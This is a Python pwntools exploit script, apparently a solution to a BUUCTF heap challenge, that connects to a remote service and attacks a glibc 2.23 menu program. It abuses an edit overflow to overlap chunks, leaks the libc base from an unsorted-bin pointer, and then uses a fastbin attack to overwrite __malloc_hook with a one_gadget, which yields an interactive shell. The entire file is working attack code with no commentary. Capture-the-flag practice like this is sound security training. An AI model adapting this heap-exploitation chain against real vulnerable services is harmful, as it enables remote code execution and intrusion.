from pwn import *

io=remote('node3.buuoj.cn',29265)
libc=ELF('./libc-2.23.so')

def add(size):
    io.recvuntil('Command: ')
    io.sendline('1')
    io.recvuntil('Size: ')
    io.sendline(str(size))

def edit(idx,size,data):
    io.recvuntil('Command: ')
    io.sendline('2')
    io.recvuntil('Index: ')
    io.sendline(str(idx))
    io.recvuntil('Size: ')
    io.sendline(str(size))
    io.recvuntil('Content: ')
    io.send(data)

def free(idx):
    io.recvuntil('Command: ')
    io.sendline('3')
    io.recvuntil('Index: ')
    io.sendline(str(idx))

def show(idx):
    io.recvuntil('Command: ')
    io.sendline('4')
    io.recvuntil('Index: ')
    io.sendline(str(idx))        

add(0x20)#0
add(0x20)#1
add(0x80)#2
add(0x60)#3
add(0x60)#4

edit(0,0x30,'a'*0x28+p64(0xc1))
free(1)
add(0xb0)#1
edit(1,0x30,'a'*0x28+p64(0x91))
free(2)
show(1)
libc_base=u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-0x3c4b78
malloc_hook=libc_base+libc.sym['__malloc_hook']
one_gadget=libc_base+0x4526a

print(hex(libc_base))
add(0x80)#2
free(3)
pl='a'*0x88+p64(0x71)+p64(malloc_hook-0x23)
edit(2,str(len(pl)),pl)

add(0x60)#3
add(0x60)#5
pl2='a'*0x13+p64(one_gadget)
edit(5,str(len(pl2)),pl2)

io.interactive()